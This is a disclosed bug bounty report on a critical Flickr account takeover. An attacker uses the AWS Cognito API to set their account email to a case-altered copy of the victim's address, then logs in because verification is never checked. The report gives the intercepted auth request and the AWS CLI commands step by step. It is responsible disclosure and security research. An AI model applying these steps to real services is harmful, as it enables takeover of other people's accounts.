# Flickr Account Takeover using AWS Cognito API

## Report Details
- **Report ID**: 1342088
- **URL**: https://hackerone.com/reports/1342088
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2021-09-16T23:41:34.093Z
- **Disclosed**: 2021-12-18T00:35:49.568Z

## Reporter
- **Username**: lauritz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: flickr

## Vulnerability Information
Flickr uses [Amazon Cognito](https://aws.amazon.com/de/cognito/) to implement its login functionality.

Furthermore, Flickr does not allow users to change their registered e-mail address via the user interface. This restriction can be bypassed via direct communication with the Amazon Cognito *User Pool* API.

Consider we have the following accounts:
1. flickr-benign@lauritz-holtmann.de (our victim)
2. An arbitrary other account that is controlled by the attacker - in the following flickr-attacker@lauritz-holtmann.de

At first, the malicious actor needs to obtain an Amazon `access_token`. To do so, intercept the login request that is sent from https://identity.flickr.com/:
```http
POST / HTTP/2
Host: cognito-idp.us-east-1.amazonaws.com
[...]

{
    "AuthFlow":"USER_PASSWORD_AUTH",
    "ClientId":"3ck15a1ov4f0d3o97vs3tbjb52",
    "AuthParameters":{
        "USERNAME":"flickr-attacker@lauritz-holtmann.de",
        "PASSWORD":"[REDACTED]",
        "DEVICE_KEY":"us-east-1_07032954-25bf-4781-b596-9d675d901072"
    },
    "ClientMetadata":
    {                
    }
}
```

If the provided credentials for the attacker controlled account are valid, Amazon responds with tokens:
```http
HTTP/2 200 OK
Date: Thu, 16 Sep 2021 22:51:36 GMT
[...]

{
    "AuthenticationResult":    
        {
            "AccessToken":"[REDACTED]",
            "ExpiresIn":3600,
            "IdToken":"[REDACTED]",
            "RefreshToken":"[REDACTED]",
            "TokenType":"Bearer"
        },
    "ChallengeParameters":
        {            
        }
}
```

The `access_token` can be directly used against Amazon's AWS API, for instance using the [AWS Command Line Interface](https://docs.aws.amazon.com/cli/) tool:

```bash
$ aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]
{
    "Username": "e28c344[...]",
    "UserAttributes": [
        {
            "Name": "sub",
            "Value": "e28[...]"
        },
        {
            "Name": "birthdate",
            "Value": "1998-09-17"
        },
        {
            "Name": "email_verified",
            "Value": "true"
        },
        {
            "Name": "locale",
            "Value": "en-us"
        },
        {
            "Name": "given_name",
            "Value": "Axel"
        },
        {
            "Name": "family_name",
            "Value": "Attacker"
        },
        {
            "Name": "email",
            "Value": "flickr-attacker@lauritz-holtmann.de"
        }
    ]
}
```

Using the API, one is able to alter some of the user attributes - including the linked e-mail address:
```bash
$ aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=flickr-Benign@lauritz-holtmann.de
{
    "CodeDeliveryDetailsList": [
        {
            "Destination": "f***@l***.de",
            "DeliveryMedium": "EMAIL",
            "AttributeName": "email"
        }
    ]
}
```

Note that the registered address is **case sensitive**.
As the above output already indicates, at this stage, the e-mail address is not verified:
```bash
$ aws cognito-idp get-user --region us-east-1 --access-token eyJraWQi[...] 
{
    "Username": "e28c34[...]",
    "UserAttributes": [
        {
            "Name": "sub",
            "Value": "e2[...]"
        },
        {
            "Name": "birthdate",
            "Value": "1998-09-17"
        },
        {
            "Name": "email_verified",
            "Value": "false"
        },
        {
            "Name": "locale",
            "Value": "en-us"
        },
        {
            "Name": "given_name",
            "Value": "Axel"
        },
        {
            "Name": "family_name",
            "Value": "Attacker"
        },
        {
            "Name": "email",
            "Value": "flickr-Benign@lauritz-holtmann.de"
        }
    ]
}
```

Strikingly, it is still possible to login at Flickr using the case-sensitive, not-verified victim e-mail address using the attacker's password:
{F1451108}
As the above video illustrates, the attacker has to make sure that within the outgoing HTTP request the capitalization of the e-mail address is as intended.

## Conclusion
The aforementioned behavior can be tracked down to the following root issues
1) Flickr does not expect e-mail addresses to be changed - still it is possible to change a user's address using the AWS Cognito API.
2) Flickr does not check whether the e-mail address is verified on login
3) Flickr normalizes the e-mail address received from AWS cognito, so that collisions are possible

## Impact

Chained as shown above, the aforementioned  vulnerabilities can be used to takeover a user's account without any user interaction. 

A malicious solely needs to know the e-mail address that is linked within a victim's account to link a crafted e-mail address to their account that can then be used to takeover the victim's account.

## Further Notices
All tests were performed against my user accounts. The user account patterns used were as follows:
* lauritz+*@wearehackerone.com
* *@lauritz-holtmann.de

Please let me know if you have any comments or questions.

## Attachments
- account-takeover.mov
